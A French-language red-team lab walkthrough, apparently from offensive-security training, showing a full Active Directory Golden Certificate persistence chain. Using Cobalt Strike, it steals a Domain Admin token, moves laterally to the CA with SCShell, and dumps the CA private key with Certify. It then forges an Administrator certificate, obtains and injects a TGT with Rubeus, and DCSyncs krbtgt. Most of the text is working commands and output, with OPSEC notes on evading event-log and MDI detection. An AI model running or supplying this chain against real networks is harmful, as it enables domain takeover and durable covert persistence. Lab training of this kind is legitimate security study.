# Lab — Domain Persistence avec Golden Certificates

> L’objectif est d’utiliser **DPERSIST1** pour une Persistence de niveau Domain Admin.
> Le scénario débute après l’obtention d’un Beacon SYSTEM sur le serveur Certificate Services.

===

1. Lancer Cobalt Strike et se connecter au team server.
2. Utiliser le Beacon high integrity pour effectuer une impersonation de Domain Admin.  

Depuis le Beacon existant, ouvrir Process Browser et rechercher un processus appartenant à `dyork`, Domain Admin sur `lon-wkstn-1`.

`process_browser`
Récupérer le token de ce processus :

`steal_token <pid>`
OPSEC-🟢SAFE — Token Impersonation dans le thread Beacon, sans création de processus.


3. Effectuer un Lateral Movement vers `lon-cs-1`.

Charger le script Aggressor de SCShell.

Ouvrir **Cobalt Strike > Script Manager**.  
Cliquer sur **Load**.  
Sélectionner `C:\Tools\SCShell\CS-BOF\scshell.cna`.  
SCShell utilise un payload de service : vérifier d’abord la configuration de `spawnto`.  

`ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`  

Effectuer le Lateral Movement vers `lon-cs-1`  
  
`jump scshell64 lon-cs-1 smb`  

> **OPSEC-🟠CAUTION** — SCShell utilise `ChangeServiceConfigA` pour modifier temporairement le chemin du binaire d’un service existant, exécuter le payload, puis restaurer la configuration.  
> Aucun nouveau service n’est créé (**pas d’Event 7045**), mais un **Event 7040** (changement de configuration du service) et une exécution inhabituelle peuvent apparaître.  
> Le named pipe SMB vers SCM peut générer l’**Event 4624 type 3** sur la cible.  

> **Alternative mentionnée dans les notes :** `jump winrm64 lon-cs-1 smb` si WinRM est actif sur la CA, sans modification de service, avec Event 4624 type 3.  
> Vérifier au préalable avec `powerpick Test-WSMan lon-cs-1`.  

⚠️ Un nouveau Beacon SYSTEM doit apparaître.


4. Récupérer le certificat de la CA.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
    ```

    > **OPSEC-🟠CAUTION** — `execute-assembly` crée un processus temporaire.  
    > Certify accède à la clé privée de la CA via l’interface COM `ICertAdmin` sous SYSTEM.  
    > Un audit détaillé de la CA peut enregistrer cette opération, même si les notes indiquent qu’aucun événement n’est généré par défaut.  
    > L’**Event 5061** (opération cryptographique) peut être généré lorsque l’audit CNG est activé.  
    > Vérifier la configuration de `spawnto` avant cette étape (exemple du lab : `dllhost.exe`).  

5. Enregistrer le certificat sur l’Attacker Desktop.  

    ```PowerShell
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))
    ```

    > **OPSEC-🟢SAFE** — Exécution sur l’Attacker Desktop, sans action Beacon ni écriture sur le disque cible.

5. Utiliser le certificat pour en générer un au nom du compte Administrator du domaine.  

    ```Terminal-nocolor
    C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
    ```

⚠️ La création de ce certificat forgé peut être effectuée sur l’Attacker Desktop plutôt que dans le Beacon.

> **OPSEC-🟢SAFE** — L’opération se déroule sur l’Attacker Desktop, sans trafic réseau ni interaction avec la CA dans le scénario décrit.  
> Le certificat forgé n’est pas soumis à la CA : les **Events 4886/4887** liés à une demande ne sont donc pas générés par cette étape.  
> L’utilisation du certificat avec **PKINIT** à l’étape 6 constitue un point de détection important.  
>
> **Note :** l’option `--crl` intègre le CRL Distribution Point ; le DC doit pouvoir joindre le chemin LDAP pour valider le certificat via PKINIT.  
> Si la vérification CRL échoue, la requête AS-REQ est rejetée.

6. Utiliser le certificat forgé pour demander un TGT au nom d’Administrator.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:[FORGED CERT] /enctype:aes256 /nowrap
    ```

    > **OPSEC-🟠CAUTION** — `execute-assembly` crée un processus temporaire. Une requête PKINIT AS-REQ génère l’**Event 4768** sur le DC. L’utilisation d’un certificat non émis par la CA peut déclencher une détection MDI. Le certificat Base64 est transmis inline, sans écriture sur le disque du Beacon.
    
> Sortie :  

```
[04/14 11:33:32] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:MIACAQMwgAYJKoZIhvcNAQcBoI<SNIP>AAAAAAAAAAAAAAAAA /enctype:aes256 /nowrap
[04/14 11:33:39] [*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:MIACAQMwgAYJKoZIhvcNAQcB<SNIP>AAAAAAAAAAAAAAAAA /enctype:aes256 /nowrap
[04/14 11:33:42] [+] host called home, sent: 591476 bytes
[04/14 11:33:43] [+] job registered with id 1
[04/14 11:33:43] [+] [job 1] received output:
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGT


[04/14 11:33:48] [+] [job 1] received output:
[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: DC=com, DC=contoso, CN=Users, CN=Administrator 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'CONTOSO\Administrator'
[*] Using domain controller: 10.10.120.1:88

[04/14 11:34:03] [+] [job 1] received output:
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGhjCCBoKgAwIBBaEDAgEWooIFjT<SNIP>09NqRwwGqADAgECoRMwERsGa3JidGd0GwdDT05UT1NP

  ServiceName              :  krbtgt/CONTOSO
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  14/04/2026 12:34:00
  EndTime                  :  14/04/2026 22:34:00
  RenewTill                :  21/04/2026 12:34:00
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  PoTe4xwS5G/yGRDXw5g/nilUs7QdzC8SHW7sL2yQnCc=
  ASREP (key)              :  AAA4ED1451C43968FB2D6209304C506FAFA3D0FE66020D1B672F905A359F4716

[04/14 11:34:03] [+] job 1 completed
```  

⚠️ Ce lab présente la récupération d’un certificat de CA et son utilisation dans une technique de Persistence élevée sur le domaine.

===

## Vérifier l’accès Domain Admin avec le TGT forgé

### Étape 1 — Injecter le TGT dans la session Beacon

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TGT]
```

> **OPSEC-🟢SAFE** — Injection du ticket en mémoire dans la session de logon du Beacon, sans écriture disque ni trafic réseau au moment de l’injection.
>
> **Alternative indiquée :** ajouter `/ptt` à `asktgt` à l’étape 6 pour injecter directement le ticket et éviter un appel distinct à `execute-assembly`.

### Étape 2 — Vérifier le chargement du ticket

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

> **OPSEC-🟢SAFE** — Contrôle local sans trafic réseau : vérifier la présence de `Administrator @ CONTOSO.COM` et la date d’expiration du ticket.

### Étape 3 — Lister le partage C$ du DC

```Beacon-nocolor
ls \\lon-dc-1.contoso.com\C$
```

> **OPSEC-🟢SAFE** — `ls` utilise le ticket Kerberos injecté via SMB et peut générer l’**Event 4624 type 3** sur le DC. Aucun service ni processus distant n’est créé. L’accès à `C$` nécessite des privilèges administratifs sur le DC.

### Étape 4 — Lire le flag sur le DC

```Beacon-nocolor
download \\lon-dc-1.contoso.com\C$\Users\Administrator\Desktop\root.txt
```

> **OPSEC-🟢SAFE** — Lecture via le canal C2 du Beacon. L’**Event 4663** peut apparaître sur le DC si l’audit Object Access est activé.

### Étape 5 — DCSync de krbtgt (si l’objectif suivant est Golden Ticket)

```Beacon-nocolor
dcsync CONTOSO.COM\krbtgt
```

> **OPSEC-🟠CAUTION** — L’opération génère potentiellement l’**Event 4662** (réplication DS) sur le DC et peut être détectée par MDI. Le lab indique qu’un accès au partage `C$` suffit à vérifier les privilèges.

---

### Récapitulatif OPSEC de la chaîne DPERSIST1

| Étape | Action | OPSEC | Events principaux |
|-------|--------|-------|------------|
| Récupération de token | `steal_token <pid>` | OPSEC-🟢SAFE | None — in-beacon thread |
| Lateral Movement vers CA | `jump scshell64` | OPSEC-🟠CAUTION | Event 7040 (svc config change), 4624 Type 3 |
| Lateral Movement alternatif | `jump winrm64` | OPSEC-🟢SAFE | Event 4624 Type 3 only |
| Récupération du certificat CA | `Certify manage-self --dump-certs` | OPSEC-🟠CAUTION | Event 5061 if CNG auditing active |
| Création du certificat forgé | `Certify forge` (attacker desktop) | OPSEC-🟢SAFE | No network, no target touch, no CA events |
| TGT via PKINIT | `Rubeus asktgt /certificate:` | OPSEC-🟠CAUTION | Event 4768 — MDI alert for non-issued cert |
| Injection de ticket | `Rubeus ptt` | OPSEC-🟢SAFE | None |
| Vérification Domain Admin | `ls \\dc\C$` | OPSEC-🟢SAFE | Event 4624 Type 3 on DC |
| Lecture du flag | `download \\dc\C$\...\root.txt` | OPSEC-🟢SAFE | Event 4663 on DC (if audited) |
| Récupération de credentials | `dcsync CONTOSO\krbtgt` | OPSEC-🟠CAUTION | Event 4662 on DC — MDI alert |

### Pourquoi les Golden Certificates peuvent dépasser les Golden Tickets pour la Persistence

| Propriété | Golden Ticket | Golden Certificate (DPERSIST1) |
|----------|--------------|-------------------------------|
| Résiste au changement du mot de passe DA | Non | **Oui** |
| Résiste à la rotation krbtgt | Non | **Oui** |
| Nécessite la clé privée CA | Non | Oui — récupération initiale |
| Détection MDI | Anomalie du ticket | PKINIT avec certificat non émis par la CA |
| Durée de Persistence | Durée du ticket (jusqu’à 10 ans selon les notes) | Durée du certificat CA (souvent 5–10 ans selon les notes) |
